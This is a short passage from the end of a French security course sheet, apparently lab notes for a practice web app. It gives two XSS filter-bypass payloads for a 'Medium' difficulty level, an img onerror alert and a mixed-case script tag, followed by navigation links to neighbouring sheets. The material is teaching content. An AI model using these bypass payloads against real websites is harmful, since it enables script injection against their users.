# (pas de guillemet simple car le paramètre est passé comme entier)

# XSS en Medium : le filtre supprime <script>
# Contournement : utiliser une balise alternative
# <img src=x onerror=alert('XSS')>
# ou : <ScRiPt>alert('XSS')</ScRiPt> (casse mixte)
```

---

## Navigation

← Fiche précédente : **[01 - Sécurité des systèmes d'exploitation](01-securite-systemes-exploitation.md)**

→ Fiche suivante : **[03 - Analyse de vulnérabilités et Reconnaissance](03-analyse-vulnerabilites.md)**
